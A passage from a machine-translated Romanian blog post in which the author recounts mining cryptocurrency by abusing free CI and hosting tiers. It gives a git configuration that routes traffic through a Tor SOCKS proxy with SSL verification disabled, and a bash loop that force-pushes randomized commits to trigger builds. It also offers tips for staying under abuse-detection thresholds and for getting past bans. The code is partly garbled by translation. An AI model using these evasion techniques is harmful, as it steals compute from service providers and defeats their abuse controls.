ar fi [Azure-pipelines], presupun că au aplicat un fel de amprentă digitală către depozitele de utilizatori, deoarece interdicțiile au apărut chiar și fără niciun abuz de resurse, de asemenea, azure și vercel sunt restricționate<code>DNS</code>  accesul în mașinile publice de construcție, astfel încât a fost o frecare suplimentară care trebuia depășită cu tunelul ad-hoc.</p><p><a href="https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome"> Trântor</a>  a dat acces la un întreg procesor de peste 16 nuclee, dar a ajuns să fie interzis după 2 versiuni<sup id="fnref:saddrone"><a class="fnref" href="#fndef:saddrone">[13]</a></sup>. <a href="https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship"> Codificare</a>  oferă, de asemenea, acces la gazde puternice de construcție și nu a interzis la fel de agresiv ca drona.</p><p>Serviciile mele preferate nu din cauza profitabilității, ci pentru ușurință și comoditate (de asemenea, cu alte proiecte) au fost<a href="https://web.archive.org/web/20210324163536/https://travis-ci.org/"> Travis</a>, <a href="https://web.archive.org/web/20210308041527/https://semaphoreci.com/"> Semafor</a>  și<a href="https://web.archive.org/web/20210322105637/https://hub.docker.com/"> Docker-hub</a> . Travis este ca CI standard și este foarte flexibil, Semaphore este singurul<code>DSL</code>  pentru<code>CI</code>  care arăta abordabil și bine, deși în loc de doar o secvență nesfârșită de casete de selectare spaghetificate ca alte UI, și Docker doar pentru simplitatea de a mapa fișierele docker la versiuni.</p><h3 id="builds_configs"><a class="header-anchor" href="#builds_configs"> Construiește configurații</a></h3><p> Build-urile au fost declanșate fie de joburile cron oferite de serviciile web, fie de comitetele git. Așadar, a trebuit să țineți evidența unei gunoiuri de jetoane de acces sau chei ssh pentru a gestiona toate comitetele git. De asemenea, a fost important să nu faceți prea multe comiteri de spam și să utilizați proxy-uri atunci când apelați la depozitele care configurează git:</p><pre><code class="toml hljs"><span class="hljs-section">[http]</span><span class="hljs-attr">proxy</span> = socks5://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9050</span><span class="hljs-attr">sslverify</span> = <span class="hljs-literal">false</span><span class="hljs-section">[https]</span><span class="hljs-attr">proxy</span> = socks5://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9050</span><span class="hljs-attr">sslverify</span> = <span class="hljs-literal">false</span><span class="hljs-section">[url "https://"]</span><span class="hljs-attr">insteadOf</span> = git://</code></pre><p> Folosind serviciile de git hosting, github a fost cel mai detaliat cu privire la interdicții, dar acestea au fost executate doar după rapoartele de abuz de către administratorii serviciilor ci, gitlab a executat un val de interdicție o singură dată, când am încercat să reînnoiesc procesul CI (neglijent). Nu am primit niciodată o interdicție pentru un cont Bitbucket. Pentru a (forța) împinge comitetele git, avem o buclă lungă care rulează din nou eticheta depozitului git:</p><pre><code class="bash hljs"><span class="hljs-keyword">while</span> :; <span class="hljs-keyword">do</span>
    repos_count=$(ls -ld <span class="hljs-variable">${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span><span class="hljs-variable">$repos</span>/*; <span class="hljs-keyword">do</span><span class="hljs-built_in">cd</span><span class="hljs-string">"<span class="hljs-variable"> $ r</span>"</span> 
        git fetch --tot
        etichetator
        <span class="hljs-built_in"> ecou</span>  -e<span class="hljs-string">"\e[32m"</span><span class="hljs-string">"sleeping for <span class="hljs-variable"> $ repos_ival</span>  de cand<span class="hljs-subst"> $ (data +% H:% M:% S \% b /% d)</span>"</span><span class="hljs-string">"\e[0m"</span> 
        dormi<span class="hljs-variable"> $ repos_ival</span><span class="hljs-keyword"> Terminat</span> 
    dormi 1<span class="hljs-keyword"> Terminat</span></code></pre><p>Ar putea fi posibil ca forța care împinge în acest mod să nu fie ceva care să-i placă foarte mult lui github și ar fi putut fi o cauză pentru conturile care au fost semnalate. Funcția de etichetare însărcinată cu împingerea forțată a unor comitere diferite, folosește un site web (pe care îl puteți căuta destul de ușor) care oferă câteva comiteri randomizate. Nu sunt sigur cât de mult ajută acest lucru, deoarece conținutul în sine al comitetelor este evident suspect pentru cazul meu. Și, de asemenea, m-a mușcat în fund o dată, deoarece comitetele returnate prin această comandă pot include cuvinte de înjurătură, una dintre comitetele mele a fost preluată de un bot de twitter care urmărește comitetele de git cu cuvinte de înjurătură! Am adăugat o listă neagră pentru cuvinte proaste după incident.</p><p> Nu m-am aprofundat cu adevărat în comitetele de git ofuscate și în depozitele de git ofuscate. Singurul caz în care foloseam un depozit mai elaborat a fost cu Bitrise, deoarece nu puteai configura o versiune dacă sistemul nu recunoaște un mediu (cum ar fi aplicațiile mobile), dar chiar și atunci nu a existat nicio rotație și a fost întotdeauna aceeași depozit, destul de ușor de identificat.</p><p> În general, dacă ar fi trebuit să trasez o curbă de clopot în jurul momentului optim pentru al meu<em> fără</em>interzicerea conturilor, pentru toate serviciile testate, ar avea un centru de aproximativ 1 oră de construire, o dată pe zi. Pentru nucleele CPU, în afară de câțiva mincinoși (cum ar fi drona), majoritatea serviciilor se așteaptă să folosiți întreaga cantitate de resurse oferite, deoarece compilările sunt rulate în mașini virtuale sau containere cu resurse constrânse ... și compilarea este de obicei o sarcină care saturează cpu, deci nu are relevanță statistică. Intuitiv, o construcție pe zi este ceea ce ar face dezvoltatorul mediu, așa că ar trebui să vă așteptați la steaguri ridicate dacă vă îndepărtați de media, iar presiunea pentru abuz nu se termină niciodată bine.</p><h2 id="conclusions"><a class="header-anchor" href="#conclusions"> Concluzii</a></h2><p> A meritat? Părțile de rețea au fost cu siguranță interesante, tratarea înregistrărilor de conturi a fost, evident, cea mai proastă parte, nimanui îi place să dea clic pe e-mailuri de confirmare nesfârșite și, la urma urmei, să repete procedurile de interacțiune mintală. Scrierea software-ului de automatizare a spamului este, de asemenea, plictisitoare (pentru că vă bateți în cea mai mare parte API-uri stupide) și, cu această presupunere (și faptul că acest lucru nu a fost niciodată ceva grav), nici măcar nu l-am luat în considerare. A fost profitabil? La apogeul ei atingea ceva de genul<code>300$</code>  pe lună, poate suficient pentru un venezuelean, nu chiar pentru mine :)</p><p></p><table class="fndef" id="fndef:adversary"><tbody><tr><td class="fndef-backref"><a href="#fnref:adversary">[1]</a></td><td class="fndef-content"><em> administratorul ursuz</em></td></tr></tbody></table><table class="fndef" id="fndef:infoproc"><tbody><tr><td class="fndef-backref"><a href="#fnref:infoproc">[2]</a></td><td class="fndef-content"> chiar dacă acest lucru ar rupe multe ipoteze de confidențialitate, sunt sigur că cele mai multe dintre ele aruncă o privire înăuntru ori de câte ori există o problemă de serviciu, dar aceasta este doar o problemă pentru runtime-urile bazate pe containere, în timp ce VM-urile sunt cam cutii negre.</td></tr></tbody></table><table class="fndef" id="fndef:monerominer"><tbody><tr><td class="fndef-backref"><a href="#fnref:monerominer">[3]</a></td><td class="fndef-content"> minerul încorporat în nodul monero a primit ceva de lucru pentru a-l face mai prietenos cu fundalul, dar distribuția xmrig nu a fost niciodată axată pe prietenia de fundal.</td></tr></tbody></table><table class="fndef" id="fndef:difficulty"><tbody><tr><td class="fndef-backref"><a href="#fnref:difficulty">[5]</a></td><td class="fndef-content">unele pool-uri oferă dificultăți diferite pe diferite porturi de conexiune și tind să alinieze dificultatea jobului la acțiunile prezentate de miner, dar granularitatea proxy-ului a fost încă mai convenabilă, deoarece ar împiedica pool-ul<a href="https://en.wikipedia.org/wiki/Vendor_lock-in"> blocare</a>  (deși nu am schimbat niciodată piscina).</td></tr></tbody></table><table class="fndef" id="fndef:configwatch"><tbody><tr><td class="fndef-backref"><a href="#fnref:configwatch">[4]</a></td><td class="fndef-content"> nu a fost fericit când configurația a apărut brusc și a dispărut din sistemul de fișiere</td></tr></tbody></table><table class="fndef" id="fndef:stratumprotocol"><tbody><tr><td class="fndef-backref"><a href="#fnref:stratumprotocol">[6]</a></td><td class="fndef-content"> Nu vorbim despre<a href="https://en.bitcoin.it/wiki/Stratum_mining_protocol"> protocolul stratului</a>  deoarece trebuie doar să ne ocupăm de orice este implementat în<em> ambii</em>  piscina și minerul ... care este de obicei minimul minim și, eventual, cu extensii nestandardizate.</td></tr></tbody></table><table class="fndef" id="fndef:fullbash"><tbody><tr><td class="fndef-backref"><a href="#fnref:fullbash">[7]</a></td><td class="fndef-content"> nu merge niciodata complet bash :)</td></tr></tbody></table><table class="fndef" id="fndef:memoryondemand"><tbody><tr><td class="fndef-backref"><a href="#fnref:memoryondemand">[8]</a></td><td class="fndef-content"> Nu am explorat ce se întâmplă atunci când un proces încarcă funcționalități suplimentare în timp de execuție, deoarece nucleul ar căuta adresa în aspectul de memorie al executabilului, care ar accesa sistemul de fișiere și ar putea provoca un accident.</td></tr></tbody></table><table class="fndef" id="fndef:freehostinglimits"><tbody><tr><td class="fndef-backref"><a href="#fnref:freehostinglimits">[9]</a></td><td class="fndef-content"> Limitele sunt arbitrare, timpul procesorului este mai mic de o secundă, memoria este mai mică de 128M, conexiunile de ieșire sunt blocate.</td></tr></tbody></table><table class="fndef" id="fndef:cpanelssh"><tbody><tr><td class="fndef-backref"><a href="#fnref:cpanelssh">[10]</a></td><td class="fndef-content"> cu un pic de răbdare, puteți rula, de asemenea, o instanță ssh completă într-un mediu încărcat în jurul spațiului contului dvs. cpanel,<em> fără</em>  având acces la SSH-ul încorporat cpanel care tinde să fie dezactivat de furnizorii de găzduire.</td></tr></tbody></table><table class="fndef" id="fndef:openshift"><tbody><tr><td class="fndef-backref"><a href="#fnref:openshift">[11]</a></td><td class="fndef-content"> openshift a trecut de la un nivel gratuit de 1 an la 3 luni la 1 lună, începând să necesite autentificare telefonică, pot garanta că nu am fost singurul care a abuzat de serviciile lor.</td></tr></tbody></table><table class="fndef" id="fndef:herokucontainers"><tbody><tr><td class="fndef-backref"><a href="#fnref:herokucontainers">[12]</a></td><td class="fndef-content"> Containerele cu nivel gratuit Heroku sunt destul de generoase în resurse, oferă 4c / 8t (virtual) cpus, o mulțime de ram și stocare mare (care, totuși, nu este persistentă și aruncată la închiderea dyno).</td></tr></tbody></table><table class="fndef" id="fndef:saddrone"><tbody><tr><td class="fndef-backref"><a href="#fnref:saddrone">[13]</a></td><td class="fndef-content">Acestea adaugă reguli de înregistrare mai stricte, după câteva interdicții, aș fi putut contribui la asta.</td></tr></tbody></table><p></p><div id="post-tags-list"> 
Post Tag-uri:
<span class="post-tag"><a href="/ro/posts/tag/crypto" style="">  cripto</a>, </span><span class="post-tag"><a href="/ro/posts/tag/net" style="">  net</a>, </span><span class="post-tag"><a href="/ro/posts/tag/shell" style="">  coajă</a></span></div><div class="page-foot"><div class="copyright"> 
        21 august 2021
    </div><script async="" crossorigin="anonymous" issue-term="pathname" label="Comment" repo="untoreh/untoreh.github.io" src="https://utteranc.es/client.js"></script></div></div><div class="page__footer"><footer><div class="page__footer-copyright"> 
            © untoreh - Dezvoltat de<a href="https://github.com/tlienart/Franklin.jl"> Franklin</a></div><div class="page__footer-links">
            -
            <ul><li><a href="/ro/sitemap.xml"> Sitemap</a></li>
                |
                <li><a href="/ro/tag"> Etichete</a></li>
                |
                <li><a href="/ro/feed.xml"> RSS</a></li></ul></div><ul class="author__wrap"><li class="author__urls social-icons"><a href="https://twitter.com/untoreh" rel="nofollow noopener noreferrer"><i aria-hidden="true" class="fab fa-fw fa-twitter-square"></i></a></li><li class="author__urls social-icons"><a href="https://github.com/untoreh" rel="nofollow noopener noreferrer"><i aria-hidden="true" class="fab fa-fw fa-github"></i></a></li><li class="author__urls social-icons"><a href="mailto:contact@unto.re"><i class="fas fa-envelope"></i></a></li><li><script type="application/ld+json">{"potentialAction":{"query-input":"required maxlength=100 name=query","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":"https://unto.re/search?&q={query}"}}</script></li></ul></footer></div><script crossorigin="anonymous" defer="" id="fa" integrity="sha384-DJ25uNYET2XCl5ZF++U8eNxPWqcKohUUBUpKGlNLMchM7q4Wjg2CUpjHLaL8yYPH" src="https://use.fontawesome.com/releases/v5.8.2/js/all.js"></script><script src="/libs/colors.js"></script><script src="/libs/menu.js"></script><script defer="" src="/libs/lunr/lunr.min.js"></script></body></HTML>